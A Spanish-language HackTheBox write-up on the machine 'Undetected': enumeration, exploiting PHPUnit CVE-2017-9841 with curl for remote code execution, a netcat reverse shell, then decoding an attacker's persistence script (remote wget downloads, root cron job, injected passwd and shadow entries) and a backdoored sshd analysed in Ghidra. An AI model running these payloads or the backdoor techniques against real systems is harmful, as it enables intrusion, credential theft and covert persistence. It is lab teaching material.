---
title: WriteUp Undetected HTB
author: rabb1t
date: 2022-07-04
categories: [HackTheBox, WriteUp, Machines, Linux]
tags: [sshd, reversing, Attacks/Backdoor, strings, Ghidra, PHP Unit, CyberChef]
math: true
mermaid: true
image:
  path: https://www.hackthebox.com/storage/avatars/642db092f1e18466871db9f12933396f.png
  width: 180
  height: 180
---
## Índice
- [Información básica de la máquina](#máquina-undetected)
- [Herramientas-y-recursos-empleados](#herramientas-y-recursos-empleados)
- [Fase de enumeración](#fase-de-enumeración)
- [Explotando fallo de PHP Unit (CVE-2017-9841)](#explotando-la-vulnerabilidad-de-php-unit)
- [Privesc steven](#escalando-prilivegios-al-usuario-steven)
- [Privesc root](#escalando-privilegios-al-usuario-root)

## Máquina Undetected

| IP     	     |10.10.11.146|
|--------------|------------|
| OS		       | Linux		  |
| Dificultad   | Media      |
| Creador	     |TheCyberGeek|

## Herramientas y recursos empleados

- Herramientas
  - nmap
  - whatweb
  - JohnTheRipper
- Recursos
  - CyberChef

-----


## Fase de enumeración
Comenzamos realizando un escaneo con nmap:
```shell
# nmap -p- --min-rate --open 5000 -sS -Pn -vvv -n -oG scan1.out 10.10.11.146
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.146 ()	Status: Up
Host: 10.10.11.146 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
```

Vamos a realizar el siguiente escaneo con _nmap_ para obtener un poquito más de información relevante sobre los puertos econtrados anteriormente:
```shell
# nmap -p80,22 -sCV -Pn -oN services.out 10.10.11.146
Nmap scan report for 10.10.11.146

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2 (protocol 2.0)
| ssh-hostkey: 
|   3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)
|   256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)
|_  256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Diana\'s Jewelry
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

Vemos el titulo de la web _Diana's Jewelry_ y la versión del servidor apache _2.4.41_, también nos dice que está corriendo el servicio en un sitema operativo Ubuntu, esto último lo podremos corroborar cuando estemos dentro del sistema (por si no hay un falso positivo), de resto no hay mucho más; por lo que, procedemos a enumerar la web ya que de momento no contamos con ninguna credencial para acceder por _ssh_. Ejecutamos la herramienta __whatweb__ en la terminal:
```shell
rabb1t@hold:~$ whatweb http://10.10.11.146
http://10.10.11.146 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.146], JQuery[2.1.4], Script, Title[Diana\'s Jewelry]
```

No obtenemos casi nada relevante (se está usando una versión desactualizada de _JQuery_, podríamos intentar ver si es vulnerable a prototype pollution) de momento sigamos enumerando.

Vamos a visualizar la web desde el navegador:
![undetected1](/assets/favicon/2022-07-04/undetected1.png)

Todos los botones que hay, no nos llevan a ninguna parte interesante a excepción de _store_, el cual es un subdominio `store.djewelry.htb`, agregamos este subdominio a nuestro archivo `/etc/hosts` para que al momento de poner el subdominio en la web, el navegador sepa resolver la dirección.

![undetected2](/assets/favicon/2022-07-04/undetected2.png)

Otra vez, ninguno de los botones nos llevan a ningún lado interesante, incluso en un apartado nos dice que la web está inoperativa para hacer pedidos.

Procedemos a _fuzzear_ directorios lanzando el script `http-enum` de `nmap` que tiene un diccionario con alrededor de `1000` rutas comunes de sitios web. En la primera web no vemos nada interesante de lo que nos podamos aprovechar (el dominio es `djewelry.htb`). Hacemos lo mismo para la segunda web con el subdomino `store` y nos encontramos los siguientes directorios:

```shell
rabb1t@hold:~$ nmap -p80 --script http-enum store.djewelry.htb
Nmap scan report for store.djewelry.htb (10.10.11.146)
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /login.php: Possible admin folder
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|_  /vendor/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
```
Ya hay dos cosas que llaman bastante la atención: de primeras, la web tiene capacidad de _directory listing_ y de segundo tenemos una carpeta llamada _vendor_ donde se encuentran librerias de PHP (según practicas que se usan normalmente en el desarrollo).

Comprobamos que tenemos _directory listing_ y vemos lo que hay en la carpeta _vendor_:
![undetected3](/assets/favicon/2022-07-04/undetected3.png)

## Explotando la vulnerabilidad de PHP Unit
Si hacemos un poco de investigación sobre lo que podemos hacer con lo que tenemos, nos encontramos con la vulnerabilidad [CVE-2017-9841](https://nvd.nist.gov/vuln/detail/CVE-2017-9841). Comprobamos que la ruta para explotar la vulnerabilidad existe. Y sí, tenemos la ruta. El código PHP se interpreta y no nos muestra nada en la web, esto pinta muy bien para nosotros.

Por lo que ejecutando lo siguiente en la terminal:
```shell
rabb1t@hold:~$ curl -sX GET http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -d "<?php system('ifconfig')?>"
```

Nos damos cuenta de que tenemos RCE (ejecución remota de comados en la máquina victima).
Vamos a entablarnos una revershell a nuestra interfaz `tun0` por el puerto `443` con `netcat`:
```shell
rabb1t@hold:~$ curl -sX GET http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -d "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 10.10.16.2 443 >/tmp/f')?>"
```

...y poniéndonos en escucha con `netcat` en otra ventana:
```shell
rabb1t@hold:~$ nc -nvlp 443
```

Ganamos acceso como el usuario `www-data`
Ahora procedemos a hacer el [tratamiento de la tty](https://github.com/barricadadigital/Pentesting/blob/master/pentesting/reverse-shell/tratamiento-de-la-tty.md) para tener una shell interactiva.

## Escalando prilivegios al usuario steven
Haciendo reconocimiento básico sobre el sistema con este usuario, no encontramos nada de lo que nos podamos aprovechar; sin embargo, hay un archivo que llama bastante la atención en la ruta `/var/backups/info` (es un binario).

Pasamos el archivo (una copia) a nuestra máquina para trabajar más comodo, escribimos lo siguiente en la máquina victima:
```shell
rabb1t@hold:~$ nc -Nv 10.10.16.9 4343 < info
```

...y en nuestra máquina escribimos:
```shell
rabb1t@hold:~$ nc -nvlp 4343 > info
```

Ejecutamos el comando `strings` sobre el binario:
```shell
rabb1t@hold:~$ strings info
```

...encontramos el siguiente texto dentro de todas las cadenas imprimibles:
>776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b

Parece hexadecimal. Lo copiamos y lo metemos en un archivo para guardar la evidencia. Ahora podemos tratarlo con el siguiente comando:
```shell
rabb1t@hold:~$ cat info_hex | xxd -p -r
```

Lo que nos muestra lo siguiente:
```shell
wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" >> /etc/crontab; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd; while read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; done < users.txt; rm users.txt;
```

Podemos observar lo que parece un hash de una contraseña, lo guardamos en un archivo. Yo le pondré `hash`. Ahora podemos crackearlo con [John the Ripper](https://www.openwall.com/john/):
```shell
rabb1t@hold:~$ john -w /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ihatehackers     (?)
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Obtenemos en texto claro su equivalencia (linea 7: `ìhatehackers`) ¿De qué usuario? En el `/etc/passwd` pudimos ver que hay dos usuarios con una shell, los cuales son "steven y steven1" (además de "root" y "www-data"). Probamos la contraseña para ambos usuarios y vemos que podemos acceder al usuario `steven1`.
```shell
❯ su steven1
Password: ihatehackers
```

Incluso si probamos la conexión por ssh, podemos acceder a ese usuario.

## Escalando privilegios al usuario root
Procedemos a realizar enumeración con este usuario. Revisando algunos archivos nos encontramos con un email en la siguiente ruta `/var/mail/steven`.
```shell
steven@production:/var/mail$ cat steven
From root@production  Sun, 25 Jul 2021 10:31:12 GMT
Return-Path: <root@production>
Received: from production (localhost [127.0.0.1])
	by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847
	for <steven@production>; Sun, 25 Jul 2021 10:31:12 GMT
Received: (from root@localhost)
	by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;
	Sun, 25 Jul 2021 10:31:12 GMT
Date: Sun, 25 Jul 2021 10:31:12 GMT
Message-Id: <202107251031.80FAcdZ171847@production>
To: steven@production
From: root@production
Subject: Investigations

Hi Steven.

We recently updated the system but are still experiencing some strange behaviour with the Apache service.
We have temporarily moved the web store and database to another server whilst investigations are underway.
If for any reason you need access to the database or web application code, get in touch with Mark and he
will generate a temporary password for you to authenticate to the temporary server.

Thanks,
sysadmin
```

El `sysadmin` le menciona a steven un comportamiento raro con el servidor apache a pesar de haber actualizado el sistema. Vayamos a revisar.
En la ruta `/lib/apache2/modules` vemos una cantidad de archivos aparentemente normales; sin embargo, el _comportamiento extraño_ puede darnos la idea de que alguien más ha comprometido el sistema, y por lo tanto, ha manipulado archivos para mantener su persistencia. Así que revisemos bien los archivos que hay:
![undetected 6](/assets/favicon/2022-07-04/undetected4.png)

Vemos que un archivo ha sido manipulado recientemente: 
```shell
-rw-r--r-- 1 root root 34800 May 17 2021 mod_reader.so
```

Nos traemos el archivo a nuestra máquina para revisarlo como hicimos con el último:
```shell
rabb1t@hold:~$ strings mod_reader.so
```

Hay una cadena en base 64. Procedemos a decodificarla y la guardamos en un archivo como evidencia:
```shell
rabb1t@hold:~$ echo "d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk" | base64 -d > mod_reader_hex.txt
```

Vemos lo siguiente:
```shell
rabb1t@hold:~$ cat mod_reader_hex.txt
wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd
```
Esto es un poco raro ya que hay un archivo de apache (`mod_reader.so`) que está haciendo algo con el demonio de ssh, están pasando cosas por aquí.

Puede que el demonio de ssh haya sido manipulado, por lo que vamos a traer el binario de la máquina victima a la nuestra para analizarlo.

Haciendo un `strings` al binario filtrando por la palabra "backdoor", vemos lo siguiente:
```shell
rabb1t@hold:~$ strings sshd | grep "backdoor" | sort -u
backdoor
backdoor_active
backdoor.h
```

Podemos intuir que efectivamente se ha manipulado el binario.

Abrimos nuestro analizador de confinza [Ghidra](https://github.com/NationalSecurityAgency/ghidra) para descompilar el binario:
![Ghidra](/assets/favicon/2022-07-04/undetected6.png)

Comenzamos a buscar funciones que pudieron ser modificadas, nos encontramos con la función `auth_passwd` que tiene lo siguiente:
![Ghidra](/assets/favicon/2022-07-04/undetected7.png)

En la linea 29 puede que no esté interpretando bien el valor, así que lo cambiamos dando clic izquierdo sobre él y haciendo clic en lo que nos interesa. En este caso a `char`.

Procedamos a analizar lo que está sucediendo allí. Prestemos atención a la variable "backdoor" la cual tiene un espacio total de 31 caracteres.
```c
/* WARNING: Could not reconcile some variable overlaps */
int auth_password(ssh *ssh,char *password){
  Authctxt *ctxt;
  passwd *ppVar1;
  int iVar2;
  uint uVar3;
  byte *pbVar4;
  byte *pbVar5;
  ulong uVar6;
  byte bVar7;
  int iVar8;
  long in_FS_OFFSET;
	//se asigna 31 caracteres de longitud
  char backdoor [31];
  byte abStack57 [9];
  long lStack48;
  
  bVar7 = 0xd6;
  ctxt = (Authctxt *)ssh->authctxt;
  lStack48 = *(long *)(in_FS_OFFSET + 0x28);
	//a las siguientes variables se les asignan valores en hexadecimal
  backdoor._28_2_ 	= 0xa9f4;
  ppVar1 			      = ctxt->pw;
  iVar8 			      = ctxt->valid;
  backdoor._24_4_ 	= 0xbcf0b5e3;
  backdoor._16_8_ 	= 0xb2d6f4a0fda0b3d6;
  backdoor[30] 		  = 0xa5;
  backdoor._0_4_ 	  = 0xf0e7abd6;
  backdoor._4_4_ 	  = 0xa4b3a3f3;
  backdoor._8_4_ 	  = 0xf7bbfdc8;
  backdoor._12_4_ 	= 0xfdb3d6e7;
  pbVar4 			      = (byte *)backdoor;

  while( true ) {
    pbVar5 = pbVar4 + 1;
    *pbVar4 = bVar7 ^ 0x96; //se está haciendo un XOR con la key 0x96 a la password ingresada
    if (pbVar5 == abStack57) break;
    bVar7 = *pbVar5;
    pbVar4 = pbVar5;
  }
  iVar2 = strcmp(0xa4b3a3f3f0e7abd6,password); //se compara el input que se pasa al conectarse por 
	// ssh (la contraseña)
  uVar3 = 1;
  if (iVar2 != 0) { //si la comparación y el input son iguales entra a este flujo
    uVar6 = strlen(password);
    uVar3 = 0;
    if (uVar6 < 0x401) {
      if ((ppVar1->pw_uid == 0) && (options.permit_root_login != 3)) {
        iVar8 = 0;
      }
      if ((*password != '\0') ||
         (uVar3 = options.permit_empty_passwd, options.permit_empty_passwd != 0)) {
        if (auth_password::expire_checked == 0) {
          auth_password::expire_checked = 1;
          iVar2 = auth_shadow_pwexpired(ctxt);
          if (iVar2 != 0) {
            ctxt->force_pwchange = 1;
          }
        }
        iVar2 = sys_auth_passwd(ssh,password);
        if (ctxt->force_pwchange != 0) {
          auth_restrict_session(ssh);
        }
        uVar3 = (uint)(iVar2 != 0 && iVar8 != 0);
      }
    }
  }
  if (lStack48 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar3;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

Bueno, vamos a intentar sacar conclusiones sobre lo visto. Parece que hay una palabra clave deconstruida en las variables "backdoor" y en el bucle `while` como lo dejé comentado. Se está haciendo un `XOR`, así que vamos a construir esa palabra clave tal que así:

```shell
backdoor[30] 	= 0xa5;
backdoor._28_2_	= 0xa9f4;
backdoor._24_4_ = 0xbcf0b5e3;
backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
backdoor._12_4_ = 0xfdb3d6e7;
backdoor._8_4_ 	= 0xf7bbfdc8;
backdoor._4_4_ 	= 0xa4b3a3f3;
backdoor._0_4_ 	= 0xf0e7abd6;
```

Ahora vamos a jugar con CyberChef: 
![CyberChef](/assets/favicon/2022-07-04/undetected8.png)

Por último nos intentamos conectar como root a la máquina victima con la contraseña obtenida:
```shell
rabb1t@hold:~$ sshpass -p '@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3' ssh root@10.10.11.146
```

Y efecticamente, esa era la comparación que se estaba haciendo en el demonio de ssh modificado.

¡Happy Hacking!